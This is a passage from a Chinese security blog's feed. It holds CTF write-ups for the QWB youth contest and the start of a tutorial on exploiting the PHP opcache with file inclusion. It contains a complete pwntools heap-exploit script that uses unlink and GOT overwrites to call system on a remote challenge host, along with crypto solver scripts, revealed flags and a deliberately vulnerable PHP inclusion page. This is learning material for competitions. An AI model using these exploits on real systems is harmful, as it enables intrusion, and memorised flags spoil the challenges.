null</code>漏洞，通过<code>chunk3</code>设置<code>chunk4</code>的<code>inuse</code>位为<code>0</code>，这样在释放<code>chunk4</code>时就会触发<code>unlink</code></p><p>利用<code>unlink</code>，在<code>chunk_list</code>中写入<code>chunk_list</code>的地址，这样可以达到任意地址读写,需要在合并之前将<code>chunk3</code>的<code>fd-&gt;bk</code>与<code>bk-&gt;fd</code>指向<code>chunk3</code>,<code>chunk3-&gt;fd</code>与<code>chunk3-&gt;bk</code>，就为<code>chunk_list</code>上的地址</p><p>然后因为程序中<code>strlen</code>和<code>free</code>都是以<code>chunk</code>为第一个参数，所以可以通过修改<code>got表</code>内<code>free</code>的内容为<code>plt表</code>中的<code>puts</code>，来获取<code>chunk3</code>的<code>fd</code>字段，计算得到<code>libc</code>地址，通过修改<code>got表</code>中的<code>strlen内容</code>为<code>system</code>地址 执行<code>system(&quot;/bin/sh&quot;)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(0~9):&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;(1 ~ 1024):&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;Content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(0~9):&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(0~9):&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(0~9):&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;Content:&#x27;</span>,data)<br><br>p=remote(<span class="hljs-string">&#x27;101.200.76.17&#x27;</span>,<span class="hljs-string">&#x27;24195&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./b64heap&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>e=ELF(<span class="hljs-string">&#x27;./b64heap&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>free_got=e.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>strlen_got=e.got[<span class="hljs-string">&#x27;strlen&#x27;</span>]<br>puts_plt=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>chunk_list=<span class="hljs-number">0x6020c0</span><br>heap_list=chunk_list<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">3</span>)<br>fd=heap_list+<span class="hljs-number">0x8</span>*<span class="hljs-number">3</span>-<span class="hljs-number">0x18</span><br>bk=heap_list+<span class="hljs-number">0x8</span>*<span class="hljs-number">3</span>-<span class="hljs-number">0x10</span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x98</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)+p64(fd)+p64(bk)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p64(<span class="hljs-number">0x90</span>))<br>free(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#free(3)</span><br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>,p64(heap_list+<span class="hljs-number">0x8</span>*<span class="hljs-number">5</span>))<br>edit(<span class="hljs-number">0</span>,p64(heap_list+<span class="hljs-number">0x8</span>))<br>edit(<span class="hljs-number">3</span>,p64(free_got))<br>edit(<span class="hljs-number">5</span>,p8(<span class="hljs-number">0x80</span>))<br>edit(<span class="hljs-number">0</span>,p64(puts_plt))<br>free(<span class="hljs-number">1</span>)<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>malloc_hook=d-<span class="hljs-number">0x58</span>-<span class="hljs-number">0x10</span><br><br>system=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(strlen_got))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(system))<br>edit(<span class="hljs-number">3</span>,p64(strlen_got))<br>edit(<span class="hljs-number">0</span>,p64(system))<br><br>edit(<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;cat flag\n&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn-pwn2-1.png"></p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="crypto1"><a href="#crypto1" class="headerlink" title="crypto1"></a>crypto1</h3><p>只有A，B和空格，明显是摩斯<br>将<code>A</code>替换成<code>-</code>，<code>B</code>替换成<code>.</code>，<code>空格</code>替换<code>/</code></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">morse</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.codedict=&#123;<span class="hljs-string">&#x27;.-&#x27;</span>:<span class="hljs-string">&quot;a&quot;</span>,<br>                    <span class="hljs-string">&#x27;-...&#x27;</span>:<span class="hljs-string">&quot;b&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.-.&#x27;</span>:<span class="hljs-string">&quot;c&quot;</span>,<br>                    <span class="hljs-string">&#x27;-..&#x27;</span>:<span class="hljs-string">&quot;d&quot;</span>,<br>                    <span class="hljs-string">&#x27;.&#x27;</span>:<span class="hljs-string">&quot;e&quot;</span>,<br>                    <span class="hljs-string">&#x27;..-.&#x27;</span>:<span class="hljs-string">&quot;f&quot;</span>,<br>                    <span class="hljs-string">&#x27;--.&#x27;</span>:<span class="hljs-string">&quot;g&quot;</span>,<br>                    <span class="hljs-string">&#x27;....&#x27;</span>:<span class="hljs-string">&quot;h&quot;</span>,<br>                    <span class="hljs-string">&#x27;..&#x27;</span>:<span class="hljs-string">&quot;i&quot;</span>,<br>                    <span class="hljs-string">&#x27;.---&#x27;</span>:<span class="hljs-string">&quot;j&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.-&#x27;</span>:<span class="hljs-string">&quot;k&quot;</span>,<br>                    <span class="hljs-string">&#x27;.-..&#x27;</span>:<span class="hljs-string">&quot;l&quot;</span>,<br>                    <span class="hljs-string">&#x27;--&#x27;</span>:<span class="hljs-string">&quot;m&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.&#x27;</span>:<span class="hljs-string">&quot;n&quot;</span>,<br>                    <span class="hljs-string">&#x27;---&#x27;</span>:<span class="hljs-string">&quot;o&quot;</span>,<br>                    <span class="hljs-string">&#x27;.--.&#x27;</span>:<span class="hljs-string">&quot;p&quot;</span>,<br>                    <span class="hljs-string">&#x27;--.-&#x27;</span>:<span class="hljs-string">&quot;q&quot;</span>,<br>                    <span class="hljs-string">&#x27;.-.&#x27;</span>:<span class="hljs-string">&quot;r&quot;</span>,<br>                    <span class="hljs-string">&#x27;...&#x27;</span>:<span class="hljs-string">&quot;s&quot;</span>,<br>                    <span class="hljs-string">&#x27;-&#x27;</span>:<span class="hljs-string">&quot;t&quot;</span>,<br>                    <span class="hljs-string">&#x27;..-&#x27;</span>:<span class="hljs-string">&quot;u&quot;</span>,<br>                    <span class="hljs-string">&#x27;...-&#x27;</span>:<span class="hljs-string">&quot;v&quot;</span>,<br>                    <span class="hljs-string">&#x27;.--&#x27;</span>:<span class="hljs-string">&quot;w&quot;</span>,<br>                    <span class="hljs-string">&#x27;-..-&#x27;</span>:<span class="hljs-string">&quot;x&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.--&#x27;</span>:<span class="hljs-string">&quot;y&quot;</span>,<br>                    <span class="hljs-string">&#x27;--..&#x27;</span>:<span class="hljs-string">&quot;z&quot;</span>,<br>                    <span class="hljs-string">&#x27;.----&#x27;</span>:<span class="hljs-string">&quot;1&quot;</span>,<br>                    <span class="hljs-string">&#x27;..---&#x27;</span>:<span class="hljs-string">&quot;2&quot;</span>,<br>                    <span class="hljs-string">&#x27;...--&#x27;</span>:<span class="hljs-string">&quot;3&quot;</span>,<br>                    <span class="hljs-string">&#x27;....-&#x27;</span>:<span class="hljs-string">&quot;4&quot;</span>,<br>                    <span class="hljs-string">&#x27;.....&#x27;</span>:<span class="hljs-string">&quot;5&quot;</span>,<br>                    <span class="hljs-string">&#x27;-....&#x27;</span>:<span class="hljs-string">&quot;6&quot;</span>,<br>                    <span class="hljs-string">&#x27;--...&#x27;</span>:<span class="hljs-string">&quot;7&quot;</span>,<br>                    <span class="hljs-string">&#x27;---..&#x27;</span>:<span class="hljs-string">&quot;8&quot;</span>,<br>                    <span class="hljs-string">&#x27;----.&#x27;</span>:<span class="hljs-string">&quot;9&quot;</span>,<br>                    <span class="hljs-string">&#x27;-----&#x27;</span>:<span class="hljs-string">&quot;0&quot;</span>,<br>                    <span class="hljs-string">&#x27;..--..&#x27;</span>:<span class="hljs-string">&quot;?&quot;</span>,<br>                    <span class="hljs-string">&#x27;-..-.&#x27;</span>:<span class="hljs-string">&quot;/&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.--.&#x27;</span>:<span class="hljs-string">&quot;(&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.--.-&#x27;</span>:<span class="hljs-string">&quot;)&quot;</span>,<br>                    <span class="hljs-string">&#x27;-....-&#x27;</span>:<span class="hljs-string">&quot;-&quot;</span>,<br>                    <span class="hljs-string">&#x27;.-.-.-&#x27;</span>:<span class="hljs-string">&quot;.&quot;</span>,<br>                    <span class="hljs-string">&#x27;--..--&#x27;</span>:<span class="hljs-string">&#x27;,&#x27;</span>,<br>                    <span class="hljs-string">&#x27;-.-.-.&#x27;</span>:<span class="hljs-string">&#x27;;&#x27;</span>,<br>                    <span class="hljs-string">&#x27;.----.&#x27;</span>:<span class="hljs-string">&#x27;\&#x27;&#x27;</span>&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GetPlain</span>(<span class="hljs-params">self,text</span>):<br>        textlist=text.split(<span class="hljs-string">&#x27;/&#x27;</span>)<br>        detext=<span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> textlist:<br>            detext+=self.codedict[i]<br>        <span class="hljs-keyword">return</span> detext;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">DeBlast</span>(<span class="hljs-params">self,text,detext</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> self.codedict.keys():<br>            <span class="hljs-keyword">if</span> text.find(i)==<span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(text)-<span class="hljs-built_in">len</span>(i))==<span class="hljs-number">0</span>:<br>                    self.delist.append(detext+self.codedict[i])<br>                    <span class="hljs-keyword">continue</span><br>                self.DeBlast(text[<span class="hljs-built_in">len</span>(i):],detext+self.codedict[i])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">self,text,seg=<span class="hljs-string">&#x27;/&#x27;</span>,point=<span class="hljs-string">&#x27;.&#x27;</span>,hor=<span class="hljs-string">&#x27;-&#x27;</span>,blast=<span class="hljs-number">0</span>,out=<span class="hljs-number">1</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            key[0]==&#x27;.&#x27;</span><br><span class="hljs-string">            key[1]==&#x27;-&#x27;</span><br><span class="hljs-string">            key[2]==&#x27;/&#x27;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        key=[point,hor,seg]<br>        div=[<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>]<br>        <span class="hljs-keyword">if</span> blast==<span class="hljs-number">0</span>:<br>            self.detext=self.GetPlain(text)<br>            <span class="hljs-keyword">if</span> out:<br>                <span class="hljs-built_in">print</span>(self.detext)<br>            <span class="hljs-keyword">return</span> self.detext<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>                text=text.replace(key[i],div[i])<br>            self.delist=[]<br>            self.DeBlast(text,<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">if</span> out:<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> self.delist:<br>                        <span class="hljs-built_in">print</span>(i)<br>            <span class="hljs-keyword">return</span> self.delist<br>m=morse()<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;classicCrypto.txt&#x27;</span>)<br>d=f.read().splitlines()<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    e=e+m.decode(i)+<span class="hljs-string">&#x27; &#x27;</span><br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn-crypto1-1.png"></p><p>在<a href="https://quipqiup.com/%E7%88%86%E7%A0%B4">https://quipqiup.com/爆破</a></p><p><code>cryptography is the practice and study of techniques for secure communication in the presence of adversarial behavior, which is divided into classical cryptography and modern cryptography. the main classical cipher types are transposition ciphers, which rearrange the order of letters in a message. an early substitution cipher was the caesar cipher, in which each letter in the plaintext was replaced by a letter some fixed number of positions further down the alphabet. since the development of rotor cipher machines in world war i and the advent of computers in world war ii, cryptography methods have become increasingly complex and its applications more varied. modern cryptography is heavily based on mathematical theory and computer science practice; cryptographic algorithms are designed around computational hardness assumptions. the growth of cryptographic technology has raised a number of legal issues in the information age. cryptography&#39;s potential for use as a tool for espionage and sedition has led many governments to classify it as a weapon and to limit or even prohibit its use and export. in some jurisdictions where the use of cryptography is legal, laws permit investigators to compel the disclosure of encryption keys for documents relevant to an investigation. cryptography also plays a major role in digital rights management and copyright infringement disputes in regard to digital media.the flag is 1d817f23-4e20-9405-bf6d-e83d055316d6, please add flag string and braces yourself, and all letters are lowercase.</code></p><p>得到flag：<code>1d817f23-4e20-9405-bf6d-e83d055316d6</code></p><h3 id="crypto2"><a href="#crypto2" class="headerlink" title="crypto2"></a>crypto2</h3><p>将题目给出的字符串进行栅栏后发现与flag形式接近</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn-crypto2-2.png"></p><p>根据flag的格式发现整个字符串需要异或32，根据题目描述的uuid格式，发现flag中小写的<code>l</code>为<code>-</code>，所以原先小写的字符在异或32的基础上还要减去31</p><p>解题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&quot;FvLFArGp[ovpxBpsssD]qCElwwoClsoColwpuvlqFv&quot;</span><br>b=<span class="hljs-string">&quot;FLAG[vxpsDqCElwwoClsoColwpuvlqFvvFrpopBss]&quot;</span><br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>    <span class="hljs-keyword">if</span> i.islower():<br>        e=e+<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">32</span>)-<span class="hljs-number">31</span>)<br>    <span class="hljs-keyword">else</span>:<br>        e=e+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">32</span>)<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn-crypto2-1.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;战队信息&quot;&gt;&lt;a href=&quot;#战队信息&quot; class=&quot;headerlink&quot; title=&quot;战队信息&quot;&gt;&lt;/a&gt;战队信息&lt;/h1&gt;&lt;p&gt;战队名称：Rml&lt;br&gt;战队排名：5&lt;/p&gt;
&lt;h1 id=&quot;解题情况&quot;&gt;&lt;a href=&quot;#解题情况&quot; class=&quot;he</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="qwb" scheme="https://www.lewiserii.top/tags/qwb/"/>
    
  </entry>
  
  <entry>
    <title>opcache缓存利用</title>
    <link href="https://www.lewiserii.top/php/opcache%E7%BC%93%E5%AD%98%E5%88%A9%E7%94%A8.html"/>
    <id>https://www.lewiserii.top/php/opcache%E7%BC%93%E5%AD%98%E5%88%A9%E7%94%A8.html</id>
    <published>2022-08-26T07:00:00.000Z</published>
    <updated>2022-09-10T09:33:36.759Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是opcache"><a href="#什么是opcache" class="headerlink" title="什么是opcache"></a>什么是opcache</h1><p>opencache是一种php7自带的缓存引擎，它将编译过一遍的的php脚本以字节码文件的形式缓存在特定目录中（在php.ini中指定）。这样节省了每次访问同一脚本都要加载和解析的时间开销。（先检查有没有bin文件有就直接用）</p><p>项目github<a href="https://github.com/GoSecure/php7-opcache-override">地址</a></p><h1 id="一：opcache缓存-文件包含"><a href="#一：opcache缓存-文件包含" class="headerlink" title="一：opcache缓存+文件包含"></a>一：opcache缓存+文件包含</h1><p>靶机：<code>lewiserii/php7-opcache-include</code></p><p>例题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//I heard you are good at PHPINFO+LFI, flag is in flag.php, find it my dear noob vegetable hacker.</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) ) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$file</span> === <span class="hljs-string">&quot;phpinfo&quot;</span> ) &#123;<br><br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/proc/i&#x27;</span> , <span class="hljs-variable">$file</span>) ) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;private&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;/var/www/html/&quot;</span> . <span class="hljs-variable">$file</span>;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br><br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-variable">$content</span> ) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nothing&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/script|&lt;\?/i&quot;</span>, <span class="hljs-variable">$content</span>) ) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;bypass me&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">include_once</span> <span class="hljs-variable">$file</span>;<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>看下opcache的状态是开启还是关闭的</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/php-opcache-include-1.png"></p><p>从上图可以得出结论，在<code>/var/www/cache/</code>下存在着PHP的缓存文件，其完整的绝对路径是<code>/var/www/cache/[一个 md5]/var/www/html/flag.php.bin</code></p><p>如果要包含文件的话就要知道路径中的md5值，查阅资料可知，这个md5被称为 <code>system id</code>,它的计算算法是固定的，由php版本号、zend extension id、Zend Bin ID，这三样拼接起来md5即可，而这3种东西正好全都在phpinfo里可以拿到，可以使用该脚本一键计算：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#!/usr/bin/env python2</span><br><br><span class="hljs-comment"># Copyright (c) 2016, 2019 GoSecure Inc.</span><br><br>import sys<br><span class="hljs-keyword">from</span> packaging import version<br>import re<br>import requests<br><br>def <span class="hljs-title function_ invoke__">md5</span>(data):<br>    <span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">type</span>(data) is str:<br>        data = <span class="hljs-title function_ invoke__">bytes</span>(data, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span 